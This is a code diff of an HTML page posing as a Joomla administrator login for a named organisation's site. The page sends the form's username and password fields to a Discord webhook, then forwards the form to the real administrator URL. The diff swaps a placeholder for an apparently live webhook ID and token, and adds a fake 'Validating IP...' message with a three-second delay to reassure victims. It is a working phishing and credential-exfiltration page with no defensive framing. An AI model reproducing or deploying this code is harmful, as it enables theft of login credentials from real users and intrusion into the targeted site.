@@ -2,6 +2,7 @@
   <title>Joomla Login</title>
   <body>
     <h2>Joomla Login</h2>
+    <p id="status-message">Validating IP...</p> <!-- Added validation message -->
     <form action="https://goodtreeacademy.org/administrator" method="POST" id="csrf_form">
       <input type="hidden" name="username" value="captured_username" />
       <input type="hidden" name="passwd" value="captured_password" />
@@ -13,11 +14,14 @@
     </form>
     <script>
       // Discord webhook URL
-      const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
+      const webhookURL = "https://discord.com/api/webhooks/1299594593372864543/TFWR27d2Qztpvy0e7yvMLaE0iZdddaVXTPapf0YQzDz-BzxN91c0fpgI4fpCOAZHXO9A";
 
       // Extract form data and send to Discord
       const form = document.getElementById("csrf_form");
       const formData = new FormData(form);
+
+      // Update the status message
+      document.getElementById("status-message").innerText = "Validating IP...";
 
       // Prepare the payload for Discord
       const payload = {
@@ -30,17 +34,21 @@
         `,
       };
 
-      // Send the data to Discord
-      fetch(webhookURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify(payload),
-      }).then(() => {
-        // Redirect to target after logging to Discord
-        form.submit();
-      });
+      // Simulate a delay for "Validating IP"
+      setTimeout(() => {
+        // Send the data to Discord
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(payload),
+        }).then(() => {
+          // Update status and submit the form
+          document.getElementById("status-message").innerText = "IP Validated. Proceeding...";
+          form.submit();
+        });
+      }, 3000); // Simulate a 3-second delay for IP validation
     </script>
   </body>
 </html>
